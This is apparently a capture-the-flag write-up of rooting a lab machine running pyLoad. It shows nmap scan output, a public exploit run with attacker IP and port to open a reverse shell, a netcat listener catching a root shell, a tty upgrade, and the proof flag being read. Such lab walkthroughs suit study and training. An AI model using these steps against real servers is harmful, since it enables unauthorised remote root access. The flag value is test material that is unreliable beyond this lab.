`Running all scans on 192.168.217.26`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT     STATE SERVICE`
`22/tcp   open  ssh`
`9666/tcp open  zoomcp`

`---------------------Starting Script Scan-----------------------`

`PORT     STATE SERVICE VERSION`
`22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.1 (Ubuntu Linux; protocol 2.0)`
`| ssh-hostkey:` 
`|   256 b9:bc:8f:01:3f:85:5d:f9:5c:d9:fb:b6:15:a0:1e:74 (ECDSA)`
`|_  256 53:d9:7f:3d:22:8a:fd:57:98:fe:6b:1a:4c:ac:79:67 (ED25519)`
`9666/tcp open  http    CherryPy wsgiserver`
`| http-robots.txt: 1 disallowed entry` 
`|_/`
`| http-title: Login - pyLoad` 
`|_Requested resource was /login?next=http://192.168.217.26:9666/`
`|_http-server-header: Cheroot/8.6.0`
`Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel`

Search Google
![[Pasted image 20240222181545.png]]

We find exploit https://www.exploit-db.com/exploits/51532

This exploit acts weird and freezes, let's see if there is another PoC.
![[Pasted image 20240222181655.png]]

`└─$ python exploit.py -t http://192.168.217.26:9666 -I 192.168.45.222 -P 80 -c id`
`[SUCCESS] Running reverse shell. Check your listener!`

This one works and it starts the reverse shell as root.
`└─$ nc -nlvp 80`          
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:80`
`Ncat: Listening on 0.0.0.0:80`
`Ncat: Connection from 192.168.217.26:36786.`
`bash: cannot set terminal process group (911): Inappropriate ioctl for device`
`bash: no job control in this shell`
`root@pyloader:~/.pyload/data# python3 -c 'import pty; pty.spawn("/bin/bash")'`
`python3 -c 'import pty; pty.spawn("/bin/bash")'`
`root@pyloader:~/.pyload/data# whoami`
`whoami`
`root`

Grab the flag
`root@pyloader:~# cat proof.txt`
`cat proof.txt`
`80b68912cb043604b3143d8a55420857`
